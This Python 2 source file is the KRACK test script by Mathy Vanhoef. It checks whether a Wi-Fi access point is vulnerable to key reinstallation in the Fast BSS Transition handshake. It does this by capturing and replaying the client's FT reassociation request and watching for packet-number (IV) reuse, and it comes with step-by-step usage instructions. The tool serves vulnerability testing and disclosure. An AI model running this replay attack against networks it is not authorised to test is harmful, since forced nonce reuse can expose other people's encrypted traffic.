#!/usr/bin/env python2

# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
#
# This code may be distributed under the terms of the BSD license.
# See LICENSE for more details.

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from libwifi import *
import sys, socket, struct, time, subprocess, atexit, select
from datetime import datetime

IEEE_TLV_TYPE_RSN = 48
IEEE_TLV_TYPE_FT  = 55

IEEE80211_RADIOTAP_RATE = (1 << 2)
IEEE80211_RADIOTAP_CHANNEL = (1 << 3)
IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)

#TODO: - Merge code with client tests to avoid code duplication (including some error handling)
#TODO: - Option to use a secondary interface for injection + WARNING if a virtual interface is used + repeat advice to disable hardware encryption
#TODO: - Test whether injection works on the virtual interface (send probe requests to nearby AP and wait for replies)

# FIXME: We are repeating the "disable hw encryption" script to client tests
USAGE = """{name} - Tool to test Key Reinstallation Attacks against an AP

To test wheter an AP is vulnerable to a Key Reinstallation Attack against
the Fast BSS Transition (FT) handshake, take the following steps:

1. The hardware encryption engine of some Wi-Fi NICs have bugs that interfere
   with our script. So disable hardware encryption by executing:

      ./disable-hwcrypto.sh

   This only needs to be done once. It's recommended to reboot after executing
   this script. After plugging in your Wi-Fi NIC, use `systool -vm ath9k_htc`
   or similar to confirm the nohwcript/.. param has been set. We tested this
   with an a TP-Link TL-WN722N and an Alfa AWUS051NH v2.

2. Create a wpa_supplicant configuration file that can be used to connect
   to the network. A basic example is:

      ctrl_interface=/var/run/wpa_supplicant
      network={{
          ssid="testnet"
          key_mgmt=FT-PSK
          psk="password"
      }}

   Note the use of "FT-PSK". Save it as network.conf or similar. For more
   info see https://w1.fi/cgit/hostap/plain/wpa_supplicant/wpa_supplicant.conf

3. Try to connect to the network using your platform's wpa_supplicant.
   This will likely require a command such as:

      sudo wpa_supplicant -D nl80211 -i wlan0 -c network.conf

   If this fails, either the AP does not support FT, or you provided the wrong
   network configuration options in step 1.

4. Use this script as a wrapper over the previous wpa_supplicant command:

      sudo {name} wpa_supplicant -D nl80211 -i wlan0 -c network.conf

   This will execute the wpa_supplicant command using the provided parameters,
   and will add a virtual monitor interface that will perform attack tests.

5. Use wpa_cli to roam to a different AP of the same network. For example:

      sudo wpa_cli -i wlan0
      > status
      bssid=c4:e9:84:db:fb:7b
      ssid=testnet
      ...
      > scan_results 
      bssid / frequency / signal level / flags / ssid
      c4:e9:84:db:fb:7b	2412  -21  [WPA2-PSK+FT/PSK-CCMP][ESS] testnet
      c4:e9:84:1d:a5:bc	2412  -31  [WPA2-PSK+FT/PSK-CCMP][ESS] testnet
      ...
      > roam c4:e9:84:1d:a5:bc
      ...
   
   In this example we were connected to AP c4:e9:84:db:fb:7b of testnet (see
   status command). The scan_results command shows this network also has a
   second AP with MAC c4:e9:84:1d:a5:bc. We then roam to this second AP.

6. Generate traffic between the AP and client. For example:

      sudo arping -I wlan0 192.168.1.10

7. Now look at the output of {name} to see if the AP is vulnerable.

   6a. First it should say "Detected FT reassociation frame". Then it will
       start replaying this frame to try the attack.
   6b. The script shows which IVs (= packet numbers) the AP is using when
       sending data frames.
   6c. Message "IV reuse detected (IV=X, seq=Y). AP is vulnerable!" means
       we confirmed it's vulnerable.

  !! Be sure to manually check network traces as well, to confirm this script
  !! is replaying the reassociation request properly, and to manually confirm
  !! whether there is IV (= packet number) reuse or not.

   Example output of vulnerable AP:
      [15:59:24] Replaying Reassociation Request
      [15:59:25] AP transmitted data using IV=1 (seq=0)
      [15:59:25] Replaying Reassociation Request
      [15:59:26] AP transmitted data using IV=1 (seq=0)
      [15:59:26] IV reuse detected (IV=1, seq=0). AP is vulnerable!

   Example output of patched AP (note that IVs are never reused):
      [16:00:49] Replaying Reassociation Request
      [16:00:49] AP transmitted data using IV=1 (seq=0)
      [16:00:50] AP transmitted data using IV=2 (seq=1)
      [16:00:50] Replaying Reassociation Request
      [16:00:51] AP transmitted data using IV=3 (seq=2)
      [16:00:51] Replaying Reassociation Request
      [16:00:52] AP transmitted data using IV=4 (seq=3)
"""

#### Basic output and logging functionality ####

ALL, DEBUG, INFO, STATUS, WARNING, ERROR = range(6)
COLORCODES = { "gray"  : "\033[0;37m",
               "green" : "\033[0;32m",
               "orange": "\033[0;33m",
               "red"   : "\033[0;31m" }

global_log_level = INFO
def log(level, msg, color=None, showtime=True):
	if level < global_log_level: return
	if level == DEBUG   and color is None: color="gray"
	if level == WARNING and color is None: color="orange"
	if level == ERROR   and color is None: color="red"
	print (datetime.now().strftime('[%H:%M:%S] ') if showtime else " "*11) + COLORCODES.get(color, "") + msg + "\033[1;0m"


#### Man-in-the-middle Code ####

class KRAckAttackFt():
	def __init__(self, interface):
		self.nic_iface = interface
		self.nic_mon = interface + "mon"
		self.clientmac = scapy.arch.get_if_hwaddr(interface)

		self.sock  = None
		self.wpasupp = None

		self.reset_client()

	def reset_client(self):
		self.reassoc = None
		self.ivs = IvCollection()
		self.next_replay = None

	def start_replay(self, p):
		assert Dot11ReassoReq in p
		self.reassoc = p
		self.next_replay = time.time() + 1

	def process_frame(self, p):
		# Detect whether hardware encryption is decrypting the frame, *and* removing the TKIP/CCMP
		# header of the (now decrypted) frame.
		# FIXME: Put this check in MitmSocket? We want to check this in client tests as well!
		if self.clientmac in [p.addr1, p.addr2] and Dot11WEP in p:
			# If the hardware adds/removes the TKIP/CCMP header, this is where the plaintext starts
			payload = str(p[Dot11WEP])

			# Check if it's indeed a common LCC/SNAP plaintext header of encrypted frames, and
			# *not* the header of a plaintext EAPOL handshake frame
			if payload.startswith("\xAA\xAA\x03\x00\x00\x00") and not payload.startswith("\xAA\xAA\x03\x00\x00\x00\x88\x8e"):
				log(ERROR, "ERROR: Virtual monitor interface doesn't seem to pass 802.11 encryption header to userland.")
				log(ERROR, "   Try to disable hardware encryption, or use a 2nd interface for injection.", showtime=False)
				quit(1)

		# Client performing a (possible new) handshake
		if self.clientmac in [p.addr1, p.addr2] and Dot11Auth in p:
			self.reset_client()
			log(INFO, "Detected Authentication frame, clearing client state")
		elif p.addr2 == self.clientmac and Dot11ReassoReq in p:
			self.reset_client()
			if get_tlv_value(p, IEEE_TLV_TYPE_RSN) and get_tlv_value(p, IEEE_TLV_TYPE_FT):
				log(INFO, "Detected FT reassociation frame")
				self.start_replay(p)
			else:
				log(INFO, "Reassociation frame does not appear to be an FT one")
		elif p.addr2 == self.clientmac and Dot11AssoReq in p:
			log(INFO, "Detected normal association frame")
			self.reset_client()

		# Encrypted data sent to the client
		elif p.addr1 == self.clientmac and Dot11WEP in p:
			iv = dot11_get_iv(p)
			log(INFO, "AP transmitted data using IV=%d (seq=%d)" % (iv, dot11_get_seqnum(p)))
			if self.ivs.is_iv_reused(p):
				log(INFO, ("IV reuse detected (IV=%d, seq=%d). " +
					"AP is vulnerable!") % (iv, dot11_get_seqnum(p)), color="green")

			self.ivs.track_used_iv(p)

	def handle_rx(self):
		p = self.sock.recv()
		if p == None: return

		self.process_frame(p)

	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Remove unused virtual interfaces to start from a clean state
		subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

	def run(self):
		self.configure_interfaces()

		self.sock = MitmSocket(type=ETH_P_ALL, iface=self.nic_mon)

		# Open the wpa_supplicant client that will connect to the network that will be tested
		self.wpasupp = subprocess.Popen(sys.argv[1:])

		# Monitor the virtual monitor interface of the client and perform the needed actions
		while True:
			sel = select.select([self.sock], [], [], 1)
			if self.sock in sel[0]: self.handle_rx()

			if self.reassoc and time.time() > self.next_replay:
				log(INFO, "Replaying Reassociation Request")
				self.sock.send(self.reassoc)
				self.next_replay = time.time() + 1

	def stop(self):
		log(STATUS, "Closing wpa_supplicant and cleaning up ...")
		if self.wpasupp:
			self.wpasupp.terminate()
			self.wpasupp.wait()
		if self.sock: self.sock.close()


def cleanup():
	attack.stop()

def argv_get_interface():
	for i in range(len(sys.argv)):
		if not sys.argv[i].startswith("-i"):
			continue
		if len(sys.argv[i]) > 2:
			return sys.argv[i][2:]
		else:
			return sys.argv[i + 1]

	return None

if __name__ == "__main__":
	if len(sys.argv) <= 1 or "--help" in sys.argv or "-h" in sys.argv:
		print USAGE.format(name=sys.argv[0])
		quit(1)

	# TODO: Verify that we only accept CCMP?
	interface = argv_get_interface()
	if not interface:
		log(ERROR, "Failed to determine wireless interface. Specify one using the -i parameter.")
		quit(1)

	attack = KRAckAttackFt(interface)
	atexit.register(cleanup)
	attack.run()


